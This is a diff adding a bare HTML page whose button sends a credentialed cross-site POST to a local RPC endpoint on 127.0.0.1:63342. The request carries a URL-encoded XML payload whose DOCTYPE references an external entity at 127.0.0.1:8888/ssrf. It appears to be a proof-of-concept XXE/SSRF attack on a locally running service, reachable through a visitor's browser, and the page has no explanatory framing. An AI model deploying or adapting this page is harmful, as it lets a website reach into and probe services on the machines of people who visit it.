@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <button>Click Me!</button>
+    <script>
+        const btn = document.querySelector('button');
+        function sendData() {
+            console.log( 'Sending data' );
+
+            const XHR = new XMLHttpRequest();
+            XHR.withCredentials = true
+
+            let urlEncodedData =
+                "%3C%21--%3Fxml+version%3D%221.0%22+%3F--%3E+++++++++++++%3C%21DOCTYPE+foo+SYSTEM+%22http%3A%2F%2F127.0.0.1%3A8888%2Fssrf%22+%5B%5D%3E+++++++++++++%3C%26foo%2F%3E"
+
+            // Define what happens on successful data submission
+            XHR.addEventListener( 'load', function(event) {
+                alert( 'Yeah! Data sent and response loaded.' );
+            } );
+
+            // Define what happens in case of error
+            XHR.addEventListener( 'error', function(event) {
+                alert( 'Oops! Something went wrong.' );
+            } );
+
+            // Set up our request
+            XHR.open( 'POST', 'http://127.0.0.1:63342/rpc2' );
+
+            // Add the required HTTP header for form data POST requests
+            XHR.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
+
+            // Finally, send our data.
+            XHR.send( urlEncodedData );
+        }
+
+        btn.addEventListener( 'click', function() {
+            sendData( {test:'ok'} );
+        } )
+    </script>
+</body>
+</html>
